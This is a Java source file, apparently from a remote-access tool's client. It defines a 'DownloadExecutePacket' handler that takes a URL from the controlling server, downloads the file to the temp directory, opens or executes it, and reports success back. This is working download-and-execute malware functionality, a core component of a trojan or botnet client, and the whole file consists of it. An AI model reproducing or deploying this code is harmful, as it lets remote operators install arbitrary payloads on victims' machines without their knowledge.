/*
 * Copyright (c) 2021, 7ctx <https://github.com/7ctx/> 
 * Email: <7ctx@mail.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package com.protocol.packets.impl;

import com.ctx.client.ChannelHandler;
import com.protocol.packets.Packet;
import com.protocol.packets.PacketType;
import com.protocol.packets.Packets;
import io.netty.buffer.ByteBuf;
import io.netty.channel.ChannelHandlerContext;
import java.awt.Desktop;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.logging.Level;
import java.util.logging.Logger;
import lombok.NonNull;
import lombok.Setter;

public class DownloadExecutePacket implements Packet
{
    @Setter
    @NonNull
    String url;

    @Override
    public int getOpcode() 
    {
        return Packets.DOWNLOAD_EXECUTE_PACKET.getCode();
    }

    @Override
    public String getDescription() 
    {
        return Packets.DOWNLOAD_EXECUTE_PACKET.getDescription();
    }
    
    @Override
    public PacketType getPacketType() 
    {
        return Packets.DOWNLOAD_EXECUTE_PACKET.getPacketType();
    }

    @Override
    public void read(ChannelHandlerContext chc, ByteBuf in) 
    {
        int length = in.readableBytes();
        byte[] array = new byte[length];
        in.readBytes(array, 0, length);
        this.url = new String(array); 
        System.out.println("url: " + url);
        
         try 
        {
            ReadableByteChannel readableByteChannel = Channels.newChannel(new URL(url).openStream());
            String fileName = Paths.get(new URI(url).getPath()).getFileName().toString();
            
            if (fileName.length() == 0) 
            {
                Throwable t = new MalformedURLException(url + " has no file");
                ChannelHandler.writeException(t);
                return; 
            }
            
            Path path = new File(System.getProperty("java.io.tmpdir") + File.separator + fileName).toPath();
            FileOutputStream fileOutputStream = new FileOutputStream(path.toString());
            fileOutputStream.getChannel().transferFrom(readableByteChannel, 0, Long.MAX_VALUE);
            ChannelHandler.writeMessage("Downloaded file: " + url + " -> " + path.toString());
            
            if (new File(path.toString()).exists() && Desktop.isDesktopSupported()) 
            {
                Desktop desktop = Desktop.getDesktop();
                desktop.open(new File(path.toString()));
                ChannelHandler.writeMessage("Executed file: " + path.toString());
            }
        } 
        catch (MalformedURLException ex) 
        {
            Logger.getLogger(DownloadExecutePacket.class.getName()).log(Level.SEVERE, null, ex);
            ChannelHandler.writeException(ex);
        } 
        catch (IOException | URISyntaxException ex) 
        {
            Logger.getLogger(DownloadExecutePacket.class.getName()).log(Level.SEVERE, null, ex);
            ChannelHandler.writeException(ex);
    }
    }
    
    @Override
    public void write(ChannelHandlerContext chc, ByteBuf out) 
    {
    }
}
